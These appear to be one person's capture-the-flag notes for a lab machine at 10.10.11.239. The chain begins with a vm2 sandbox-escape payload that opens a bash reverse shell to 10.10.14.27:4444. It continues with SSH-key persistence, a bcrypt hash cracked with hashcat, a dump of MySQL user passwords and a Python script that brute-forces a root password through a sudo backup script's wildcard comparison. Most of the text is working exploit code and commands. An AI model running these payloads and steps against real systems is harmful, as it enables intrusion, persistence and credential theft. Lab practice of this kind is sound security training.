# ip
10.10.11.239

# lien exploit Sandbox Escape in vm2@3.9.16
https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244

# rev shell
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync("bash -c 'sh -i >& /dev/tcp/10.10.14.27/4444 0>&1'");
}

console.log(vm.run(code));

# connection ssh
~/.ssh/
ssh-keygen -f mykey
chmod 600 mykey
echo "<mykey.pub>" >> ~/.ssh/authorized_keys
ssh -i mykey <username>@<remote_ip>

# sql info
/var/www/contact/tickets.db
joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2

# hash bcrypt
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2

# crack password hashcat
hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt
password:
spongebob1

su joshua
spongebob1

# root mysql command
mysql -u joshua -h 0.0.0.0 -p
show databases;
show tables;
describe user;
select User, Password from user;

# root password
*4ECCEBD05161B6782081E970D9D2C72138197218

# script python3 crack password *
import string
import subprocess

all_chars = list(string.ascii_letters + string.digits)
passwd = ""
fl = 0

while not fl:
        for char in all_chars:
                command = f"echo '{passwd}{char}*' | sudo /opt/scripts/mysql-backup.sh"
                out = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True).stdout
                if "confirmed" in out:
                        passwd += char
                        print(f"\r{passwd}", end='')
                        break
        else:
                fl = 1
                print()